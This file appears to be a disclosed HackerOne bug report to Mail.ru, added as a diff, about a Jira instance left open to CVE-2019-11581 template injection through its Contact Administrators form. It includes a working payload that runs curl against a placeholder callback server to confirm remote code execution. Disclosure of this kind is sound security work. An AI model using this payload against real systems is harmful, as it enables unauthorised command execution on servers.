@@ -1,0 +1,35 @@
+ReportLink:https://hackerone.com/reports/706841
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/malcolmx
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:none
+State:Closed
+DateOfDisclosure:04.10.2019 18:07:52
+
+Summary:
+
+Hello,
+
+##Summary
+i found the domain  ` my-com.atlassian.net ` is vulnerable with RCE  Jira(CVE-2019–11581)  via contact admin function
+
+##POC
+- on page https://my-com.atlassian.net/secure/ContactAdministrators!default.jspa
+- use payload  on Subject & Request details
+
+` $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://your_server_here/rcetest?a=a').waitFor() ` 
+
+
+{F597959}
+
+- Then I immediately received a bunch of curl callbacks on my host from 185.6.245.156, which confirmed the vulnerability.
+
+
+{F597958}
+
+## Impact
+
+Command Injection and RCE
+
+Regards
